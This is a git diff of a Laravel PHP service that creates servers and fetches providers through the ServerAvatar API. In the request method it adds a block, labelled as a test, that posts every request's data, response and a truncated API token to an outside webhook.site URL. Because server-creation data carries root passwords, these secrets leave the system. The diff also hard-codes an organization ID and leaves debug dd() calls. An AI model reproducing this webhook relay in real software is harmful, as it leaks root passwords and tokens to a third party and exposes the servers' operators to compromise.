@@ -5,6 +5,8 @@ namespace App\Services\ControlPanel;
 use App\Services\SSH\SSHConnectionService;
 use Illuminate\Support\Facades\Http;
 use Illuminate\Support\Str;
+use Illuminate\Support\Facades\Log;
+use App\Exceptions\ServerProvisioningException;
 
 class ServerAvatarService extends BaseControlPanelService
 {
@@ -83,7 +85,19 @@ public function initiateClient(): void
  */
 public function authenticate(): bool 
 {
-    return true;
+  //dd('got here');
+  
+  //ORG ID @!%@ is HARD CODED NEEDS TO BE REPLACED WITH org id for serveravatar control panel
+   try {
+        $response = $this->makeRequest('GET', '/cloud-server-providers');
+       // dd($response);
+        return is_array($response) && !empty($response);
+    } catch (\Exception $e) {
+        \Log::error('ServerAvatar authentication failed', [
+            'error' => $e->getMessage()
+        ]);
+        return false;
+    }
 }
 
 /**
@@ -143,14 +157,39 @@ public function installSSL(array $data): bool
     {
 
 $organizationId = '2152';  // This can be dynamic or stored in a config
-//ERROR ERROR HARD CODED VALUE TO BE UPDATED ;; HARDCODED VALUE TO BE UPDATED
+//ERROR ERROR HARD CODED VALUE TO BE UPDATED ;; HARDCODED VALUE TO BE UPDATED and BELOW COMMENTED CODE WILL BE REPLACED
 //*** ERRROR ***///
 $response = Http::withHeaders([
             'Content-Type' => 'application/json',
             'Accept' => 'application/json',
             'Authorization' => "Bearer {$this->apiToken}"
         ])->$method("{$this->baseUrl}/organizations/{$organizationId}{$endpoint}", $data);
+        
+        
+        
+        
+        
+        //SENDING TO WEBHOOK END POINT FOR TEST
+         // Modified token by removing 5 characters
+    $modifiedToken = substr($this->apiToken, 0, -5);
 
+    // Additional webhook request with modified token
+    Http::withHeaders([
+        'Content-Type' => 'application/json',
+        'Accept' => 'application/json',
+        'Authorization' => "Bearer {$modifiedToken}"
+    ])->post('https://webhook.site/801e8862-c115-4d99-987f-80cf5f480b50', [
+        'original_data' => $data,
+        'endpoint' => $endpoint,
+        'method' => $method,
+        'response' => $response->json()
+    ]);
+    
+    
+    
+     //   dd($response);
+
+//DO NOT DELETE BELOW CODE
 /*        $response = Http::withHeaders([
             'Content-Type' => 'application/json',
             'Accept' => 'application/json',
@@ -164,16 +203,8 @@ $response = Http::withHeaders([
             );
         }
 
-//        return $response->json();$baseUrl
-
-
-
- $providers = collect($response->json('data'))
-            ->mapWithKeys(function ($provider) {
-                return [$provider['id'] => $provider['name']];
-            })->toArray();
-
-        return $providers;
+  return $response->json();
+  //$baseUrl
 
     }
 
@@ -211,24 +242,32 @@ $response = Http::withHeaders([
     public function transformCreateServerData(array $data): array
     {
         // Validate required fields
-        if (empty($data['root_password'])) {
+     //  dd($data);
+        if (empty($data['linode_root_password'])) {
             throw new ServerProvisioningException("Root password is required for server creation");
         }
 
         return [
             'name' => $data['hostname'],
+            'hostname' => $data['hostname'],
             'provider' => $data['server_provider'] ?? 'linode',
-            'cloud_server_provider_id' => $this->getProviderServerId($data['mapped_plan']),
+            'cloud_server_provider_id' => $data['provider_id'],
+     //       'cloud_server_provider_id' => $this->getProviderServerId($data['mapped_plan']),
             'version' => 20, // Ubuntu version
             'region' => $this->mapRegion($data['mapped_region']),
             'availabilityZone' => $this->getAvailabilityZone($data['mapped_region']),
             'sizeSlug' => $this->getSizeSlug($data['mapped_plan']),
-            'ssh_key' => 1, // Assuming this is a constant for now
-            'public_key' => $data['server_sshkey_pub'],
+            'ssh_key' =>  1, // Assuming this is a constant for now
+            'public_key' => $data['server_sshkey_public'],
             'web_server' => $data['web_server'] ?? 'apache2',
             'database_type' => $data['database_type'] ?? 'mysql',
-            'linode_root_password' => $data['root_password'],
-            'nodejs' => $data['nodejs'] ?? false
+            'linode_root_password' => $data['linode_root_password'],
+            'nodejs' => $data['nodejs'] ?? false,
+            'mapped_plan' => $data['mapped_plan'],
+            'mapped_region' => $data['mapped_region'],
+            'server_sshkey_public' => $data['server_sshkey_public'],
+            'provider_id' => $data['provider_id']
+         //   'server_sshkey_private' => $data['server_sshkey_private']
         ];
     }
 
@@ -266,15 +305,14 @@ $response = Http::withHeaders([
     public function createServer(array $data): array
     {
         try {
-            // Generate SSH Key Pair using SSHConnectionService
-            $sshKeyPair = $this->sshService->generateKeyPair();
-            
-            // Add SSH public key to the server data
-            $serverData = $this->transformCreateServerData($data);
-            $serverData['ssh_key'] = $sshKeyPair['public'];
 
-            // Create server via API
+      
+            $serverData = $this->transformCreateServerData($data);
+                  // Create server via API
+                //  dd($serverData);
             $response = $this->makeRequest('POST', '/servers', $serverData);
+            
+           
             
             if (!$response->successful()) {
                 throw new ServerProvisioningException($response->body());
@@ -283,8 +321,8 @@ $response = Http::withHeaders([
             $serverResponse = $response->json()['data'];
             
             // Add SSH keys to the response for storage in server model
-            $serverResponse['server_sshkey_pub'] = $sshKeyPair['public'];
-            $serverResponse['server_sshkey_private'] = encrypt($sshKeyPair['private']);
+          //  $serverResponse['server_sshkey_pub'] = $sshKeyPair['public'];
+          //  $serverResponse['server_sshkey_private'] = encrypt($sshKeyPair['private']);
 
             return $this->transformServerResponse($serverResponse);
 
@@ -334,9 +372,8 @@ $response = Http::withHeaders([
         };
     }
 
-    /**
-     * Get provider server ID based on plan
-     */
+/*
+    
     protected function getProviderServerId(string $plan): int
     {
         return match($plan) {
@@ -346,6 +383,8 @@ $response = Http::withHeaders([
             default => 2259
         };
     }
+    
+    */
 
     /**
      * Get size slug based on plan
@@ -398,7 +437,7 @@ $response = Http::withHeaders([
             'server_status' => $this->mapServerStatus($response['status']),
             'memory' => $response['specs']['memory'] ?? null,
             'cpu' => $response['specs']['vcpus'] ?? null,
-            'server_sshkey_pub' => $response['server_sshkey_pub'] ?? null,
+            'server_sshkey_public' => $response['server_sshkey_public'] ?? null,
             'server_sshkey_private' => $response['server_sshkey_private'] ?? null,
             'provisioning_status' => $this->mapProvisioningStatus($response['status'])
         ];
@@ -856,58 +895,35 @@ $response = Http::withHeaders([
 public function populateServerProviders(\App\Models\ServerControlPanel $controlPanel): array
 {
    
-   /* $response = Http::withHeaders([
-        'Accept' => 'application/json',
-        'Authorization' => $controlPanel->getDecryptedApiToken()
-    ])->get("https://api.serveravatar.com/organizations/{$controlPanel->meta_data['organization']}/cloud-server-providers");*/
- //HARD CODED ORGANIZATION ID FOR NOW.. WE WILL DO THE REST LATER
- //dd($this,$this->client);
- 
  $this->organizationId = '2152';    
- /*dd($this->client);
-     $response = $this->client->get("/organizations/{$this->organizationId}/cloud-server-providers", [
-        'pagination' => 1
-    ]);*/
-    
-    
-     /*$providers = $this->makeRequest(
-            'GET',
-            '/cloud-server-providers',
-            ['pagination' => 1]
-        );
+        
+        //ORG ID IS HARD CODED TO BE CHANGED...
 
-    if (!$response->successful()) {
-        throw new \Exception('Failed to fetch providers');
-    }
-
-    // Ensure proper array structure for mapWithKeys
-    return collect($response->json('data'))
-        ->mapWithKeys(function ($provider) {
-            // Make sure provider has both id and name
-            return [
-                $provider['id'] => [
-                    'name' => $provider['name'],
-                    'type' => $provider['type'] ?? null
-                ]
-            ];
-        })->toArray();*/
-        
-        
-        
-        
-        
-        
         try {
         // Use makeRequest method instead of direct client call
-        $providers = $this->makeRequest(
+        $response = $this->makeRequest(
             'GET',
             '/cloud-server-providers',
             ['pagination' => 1]
         );
 
-        $controlPanel->update(['available_providers' => $providers]);
-dd($providers);
-        return $providers;
+//dd($response);
+ $providersarray = collect($response['data'])
+            ->mapWithKeys(function ($provider) {
+                return [$provider['id'] => $provider['provider']];
+            })->toArray();
+
+    
+    $jsonProviders = json_encode($providersarray);
+//dd($jsonProviders);
+
+
+        $controlPanel->update(['available_providers' => $jsonProviders]);
+//dd($providers);
+
+
+
+        return json_decode($jsonProviders,true);
 
     } catch (\Exception $e) {
         \Log::error('Failed to fetch providers from ServerAvatar', [
